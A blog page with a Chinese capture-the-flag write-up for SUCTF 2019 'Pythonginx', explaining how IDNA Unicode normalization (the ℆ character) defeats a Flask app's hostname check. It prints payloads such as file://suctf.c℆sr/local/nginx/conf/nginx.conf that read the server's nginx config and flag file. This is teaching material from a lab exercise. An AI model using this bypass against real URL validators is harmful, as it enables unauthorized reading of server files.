@@ -1,0 +1,69 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author"><title>writeup · Mashiroの小站</title><meta name="description" content="[SUCTF 2019] Pythonginx#知识点#idna#对于idna这种unicode，之前在blackhat 2019的ppt上看到过一回
+
+https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-"><meta name="keywords" content=""><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="short icon" href="/images/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/bootstrap.min.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="stylesheet" href="/css/style-dark.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><meta name="generator" content="Hexo 5.1.1"><link rel="stylesheet" href="/css/prism.css" type="text/css"></head><body><div id="stage" class="container"><div class="row"><div id="side-bar" class="col-sm-3 col-xs-12 side-container invisible"><div class="vertical-text site-title"><h3 tabindex="-1" class="site-title-small"><a href="/" class="a-title">Typography</a></h3><h1 tabindex="-1" class="site-title-large"><a href="/" class="a-title">Sakamoto</a></h1><!--h6(onclick="triggerSiteNav()") Trigger--></div><br class="visible-lg visible-md visible-sm"><div id="site-nav" class="site-title-links"><ul><li><a href="/">Home</a></li><li><a href="/archives">Archive</a></li><li><a href="/categories">Categories</a></li><li><a href="/tags">Tags</a></li><li><a href="/categories/index.html">categories</a></li><li><a href="/leetcode/index.html">leetcode</a></li><li><a href="/tags/index.html">tags</a></li><li><a href="/writeup/SUCTF_2018.html">writeup</a></li><li><a href="/writeup/SUCTF_2019.html" class="current">writeup</a></li><li><a href="/writeup/index.html" class="current">writeup</a></li><li><a href="/writeup/MRCTF_2020.html">writeup</a></li><li class="soc"><a href="https://github.com/mashiro01" target="_blank" rel="noopener noreferrer"><i class="fa fa-github">&nbsp;</i></a><a href="https://mashiro01.github.io/atom.xml" target="_blank" rel="noopener noreferrer"><i class="fa fa-rss">&nbsp;</i></a></li></ul><div class="visible-lg visible-md visible-sm site-nav-footer"><br class="site-nav-footer-br"><footer><p>&copy;&nbsp;2020&nbsp;<a target="_blank" href="https://mashiro01.github.io" rel="noopener noreferrer">Mashiroi</a></p><p>Theme&nbsp;<a target="_blank" href="https://github.com/SumiMakito/hexo-theme-typography" rel="noopener noreferrer">Typography</a>&nbsp;by&nbsp;<a target="_blank" href="https://www.keep.moe" rel="noopener noreferrer">Makito</a></p><p>Proudly published with&nbsp;<a target="_blank" href="https://hexo.io" rel="noopener noreferrer">Hexo</a></p></footer></div></div></div><div id="main-container" class="col-sm-9 col-xs-12 main-container invisible"><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post-container"><p class="post-title"><a>writeup</a></p><p class="post-meta"><span class="date meta-item">Posted at&nbsp;2020-09-05</span><span class="meta-item"><i class="fa fa-comment-o"></i><span>&nbsp;</span><a href="/writeup/SUCTF_2019.html#comments">Comments</a></span></p><p class="post-abstract"><h2><span id="suctf-2019-pythonginx">[SUCTF 2019] Pythonginx</span><a href="#suctf-2019-pythonginx" class="header-anchor">#</a></h2><h3><span id="zhi-shi-dian">知识点</span><a href="#zhi-shi-dian" class="header-anchor">#</a></h3><h4><span id="idna">idna</span><a href="#idna" class="header-anchor">#</a></h4><p>对于<code>idna</code>这种unicode，之前在<code>blackhat 2019</code>的ppt上看到过一回</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf">https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf</a></p>
+</blockquote>
+<p>对于idna的描述，wiki上大致是这样写的</p>
+<blockquote>
+<p>An internationalized domain name (IDN) is an Internet domain name that contains at least one label that is displayed in software applications, in whole or in part, in a language-specific script or alphabet, such as Arabic, Chinese, Cyrillic, Devanagari, Hebrew or the Latin alphabet-based characters with diacritics or ligatures, such as French. These writing systems are encoded by computers in multibyte Unicode. Internationalized domain names are stored in the Domain Name System (DNS) as ASCII strings using Punycode transcription.</p>
+</blockquote>
+<p>总的来说就是为了统一不同国家间的特殊字符域名而设计出来的一种编码</p>
+<p>idna使用<code>Punycode</code>的方式进行编码</p>
+<p><img src="./../images/writeup/[SUCTF%202019]%20Pythonginx/puny.png" alt="puny"></p>
+<p>当我们尝试把idna转到utf-8的形式时，有的时候会发生一些特殊的转化</p>
+<p><img src="./../images/writeup/[SUCTF%202019]%20Pythonginx/2.png" alt="2"></p>
+<p>这样当浏览器或者是后端误以为其是utf-8而进行解码的话，就会导致严重的安全问题</p>
+<p><img src="./../images/writeup/[SUCTF%202019]%20Pythonginx/3.png" alt="3"></p>
+<h3><span id="jie-ti">解题</span><a href="#jie-ti" class="header-anchor">#</a></h3><p>进入题目看到源码</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">@app.route(&#39;&#x2F;getUrl&#39;, methods&#x3D;[&#39;GET&#39;, &#39;POST&#39;])
+def getUrl():
+    url &#x3D; request.args.get(&quot;url&quot;)
+    host &#x3D; parse.urlparse(url).hostname
+    if host &#x3D;&#x3D; &#39;suctf.cc&#39;:
+        return &quot;我扌 your problem? 111&quot;
+    parts &#x3D; list(urlsplit(url))
+    host &#x3D; parts[1]
+    if host &#x3D;&#x3D; &#39;suctf.cc&#39;:
+        return &quot;我扌 your problem? 222 &quot; + host
+    newhost &#x3D; []
+    for h in host.split(&#39;.&#39;):
+        newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))
+    parts[1] &#x3D; &#39;.&#39;.join(newhost)
+    #去掉 url 中的空格
+    finalUrl &#x3D; urlunsplit(parts).split(&#39; &#39;)[0]
+    host &#x3D; parse.urlparse(finalUrl).hostname
+    if host &#x3D;&#x3D; &#39;suctf.cc&#39;:
+        return urllib.request.urlopen(finalUrl).read()
+    else:
+        return &quot;我扌 your problem? 333&quot;
+    &lt;&#x2F;code&gt;
+    &lt;!-- Dont worry about the suctf.cc. Go on! --&gt;
+    &lt;!-- Do you know the nginx? --&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>得到能用的信息</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">1. 输入的文本是经h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;)处理的
+2. 大致切入点是suctf.cc这个字符串
+3. 服务端是nginx，大致需要读nginx的配置文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<blockquote>
+<p>nginx配置文件位置/usr/local/nginx/conf/nginx.conf</p>
+</blockquote>
+<p>可以看到c和u恰好能够找到<code>℆</code>这样的字符来进行利用，能够直接进行配置文件的读取</p>
+<p>利用文件协议读出文件</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">file:&#x2F;&#x2F;suctf.c℆sr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">server &#123; listen 80; location &#x2F; &#123; try_files $uri @app; &#125; location @app &#123; include uwsgi_params; uwsgi_pass unix:&#x2F;&#x2F;&#x2F;tmp&#x2F;uwsgi.sock; &#125; location &#x2F;static &#123; alias &#x2F;app&#x2F;static; &#125; # location &#x2F;flag &#123; # alias &#x2F;usr&#x2F;fffffflag; # &#125; &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>再读出flag</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">file:&#x2F;&#x2F;suctf.c℆sr&#x2F;fffffflag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3><span id="can-kao-lian-jie">参考链接</span><a href="#can-kao-lian-jie" class="header-anchor">#</a></h3><ul>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cimuhuashuimu/p/11490431.html">idna与utf-8编码漏洞</a></li>
+</ul>
+</p></div><a id="comments"></a><div id="disqus_thread"></div><script>var disqus_shortname = 'mashiro01';
+var disqus_identifier = 'writeup/SUCTF_2019.html';
+var disqus_title = 'writeup';
+var disqus_url = 'https://mashiro01.github.io/writeup/SUCTF_2019.html';
+(function () {
+    var dsq = document.createElement('script');
+    dsq.type = 'text/javascript';
+    dsq.async = true;
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+})();</script><script id="dsq-count-scr" src="//mashiro01.disqus.com/count.js" async></script></div></div></div><div class="visible-xs site-bottom-footer"><footer><p>&copy;&nbsp;2020&nbsp;<a target="_blank" href="https://mashiro01.github.io" rel="noopener noreferrer">Mashiroi</a></p><p>Theme&nbsp;<a target="_blank" href="https://github.com/SumiMakito/hexo-theme-typography" rel="noopener noreferrer">Typography</a>&nbsp;by&nbsp;<a target="_blank" href="https://www.keep.moe" rel="noopener noreferrer">Makito</a></p><p>Proudly published with&nbsp;<a target="_blank" href="https://hexo.io" rel="noopener noreferrer">Hexo</a></p></footer></div></div></div></div><script src="/js/jquery-3.1.0.min.js"></script><script src="/js/bootstrap.min.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script><script src="/js/google-analytics.js"></script><script src="/js/typography.js"></script></body></html>
